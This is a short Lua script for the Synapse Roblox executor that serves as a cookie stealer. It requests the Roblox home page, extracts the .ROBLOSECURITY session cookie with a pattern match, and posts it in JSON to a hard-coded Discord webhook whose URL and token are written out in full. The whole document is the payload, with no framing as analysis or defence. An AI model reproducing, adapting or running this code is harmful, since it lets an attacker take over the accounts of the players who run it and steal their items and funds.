local webhook = "https://discord.com/api/webhooks/1347526594507440128/BRjQ7YFz3tmVd3DI7Sxa7aS7irvviR2Set907FOGKz-Wi3JMDMBXSv6OBx4UtEH8rvHM"
local http = game:GetService("HttpService")
local cookie = syn.request({Url="https://www.roblox.com/home",Method="GET"}).Headers.Cookie
local parsed = cookie:match(".ROBLOXSECURITY=%w+")

syn.request({
Url = webhook,
Method = "POST",
Headers = {["Content-Type"] = "application/json"},
Body = http:JSONEncode({content = "lua\n"..parsed.."\n"})
})